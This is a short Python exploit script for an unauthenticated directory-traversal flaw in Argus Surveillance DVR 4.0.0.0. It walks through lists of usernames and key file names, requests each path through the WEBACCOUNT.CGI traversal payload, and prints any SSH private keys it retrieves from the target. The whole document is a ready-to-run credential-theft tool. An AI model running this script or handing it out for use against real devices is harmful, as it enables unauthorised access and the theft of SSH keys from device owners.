#!/usr/bin/python3

# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Vendor: www.argussurveillance.com
#
# Description:
# This script uses the Argus Surveillance DVR 4.0.0.0 exploit that allows Unauthenticated Directory Traversal to  
# iterate over usernames searching for a SSH key file in a home path.
import argparse
import requests
import pentest.wordlist as wordlist


def search_keys(ip, usernames, keys):

    URL = "http://" + ip + ":8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE="
    LFI = "../../../../../../../../../../../../../../../../"
    QUERY = "&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

    for username in usernames:
        for key in keys:
            path = "Users/{}/SSH/{}".format(username, key)
            payload = URL + LFI + path + QUERY
            print(path)
            response = requests.get(payload)
            if response.status_code == 200 and "<HTML>" not in response.text:
                print("Username, key found: ", username, key)
                print("Response: ")
                print(response.text, "\n")



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="ip of target.")
    parser.add_argument("users", help="filename of user names.")
    parser.add_argument("keys", help="filename of possible key names.")
    args = parser.parse_args()

    username_list = wordlist.Wordlist(args.users).words
    key_list = wordlist.Wordlist(args.keys).words
    search_keys(args.ip, username_list, key_list)


if __name__ == "__main__":
    main()
